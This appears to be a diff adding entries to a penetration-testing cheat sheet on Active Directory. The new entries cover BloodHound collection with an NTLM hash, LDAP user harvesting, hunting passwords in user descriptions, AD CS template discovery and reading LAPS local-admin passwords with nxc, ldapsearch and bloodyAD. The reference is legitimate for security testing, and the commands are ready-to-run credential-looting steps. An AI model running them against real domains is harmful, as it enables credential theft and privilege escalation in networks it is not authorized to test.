@@ -28,12 +28,15 @@ Map the domain attack surface after the first valid credential.
 
 ### BloodHound Collection
 
-#Username #Password #LDAP #ActiveDirectory #Enumeration
+#Username #Password #Hash #LDAP #ActiveDirectory #Enumeration
 Collect BloodHound data with NetExec or `bloodhound-python`, then launch the GUI.
 
 ```sh
 # Option 1: NetExec collection.
 nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --dns-server <DC_IP> --bloodhound --collection All
+
+# Option 1b: NetExec collection with an NTLM hash.
+nxc ldap <DC_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN> --dns-server <DC_IP> --bloodhound --collection All
 
 # Option 2: bloodhound-python collection.
 bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -v --zip -c All,LoggedOn -dc <DC_HOST> -ns <DC_IP>
@@ -120,6 +123,10 @@ Enumerate users and groups over LDAP.
 ```sh
 nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users
 nxc ldap <DC_IP> -u <USER> -p '<PASS>' --groups
+
+# Save LDAP users and append clean usernames to users.txt.
+nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users > real_users.txt
+awk '{print $5}' real_users.txt | grep -E '^[A-Za-z][A-Za-z.]+$' | tr '[:upper:]' '[:lower:]' | sort -u | grep -vxFf users.txt >> users.txt
 ```
 
 #Username #Password #SMB #ActiveDirectory #Enumeration
@@ -145,6 +152,7 @@ Get-DomainUser
 Get-DomainGroup
 Get-DomainComputer | Select-Object dnshostname,operatingsystem
 Get-DomainGroupMember -Identity "Domain Admins"
+Get-DomainUser | Where-Object {$_.description} | Select-Object samaccountname,description
 Find-DomainShare -CheckShareAccess
 Get-DomainGPO
 Get-DomainTrust
@@ -195,6 +203,42 @@ Find vulnerable AD CS templates.
 
 ```sh
 certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> -vulnerable
+certipy-ad find -u <USER> -p '<PASS>' -dc-ip <DC_IP> -target <DOMAIN> -vulnerable -enabled
+```
+
+### LAPS Query
+
+#Username #Password #LDAP #ActiveDirectory #Looting
+Query LAPS-managed local admin passwords when your rights allow reading `ms-Mcs-AdmPwd`.
+
+```sh
+# Sync time before Kerberos/LDAP-heavy checks when clocks drift.
+sudo ntpdate <DC_IP>
+
+# Windows target: check whether LAPS is installed.
+dir "C:\Program Files\LAPS"
+# Example output:
+# AdmPwd.UI.exe
+# AdmPwd.Utils.dll
+
+# NetExec LAPS query.
+nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --laps
+
+# LDAP query for readable LAPS passwords.
+ldapsearch -x -H ldap://<DC_IP> \
+  -D '<DOMAIN>\<USER>' -w '<PASS>' \
+  -b '<DOMAIN_DN>' \
+  '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd
+# Example output:
+# ms-Mcs-AdmPwd: <LAPS_PASS>
+
+# Query one computer object directly.
+bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASS>' get object '<COMPUTER_NAME>$' --attr ms-Mcs-AdmPwd
+
+# Validate the recovered local admin password.
+nxc ldap <DC_IP> -d <DOMAIN> -u <LAPS_LOCAL_ADMIN> -p '<LAPS_PASS>' --kdcHost <DC_IP>
+# Example output:
+# [+] <DOMAIN>\<LAPS_LOCAL_ADMIN>:<LAPS_PASS>
 ```
 
 ### SYSVOL Looting
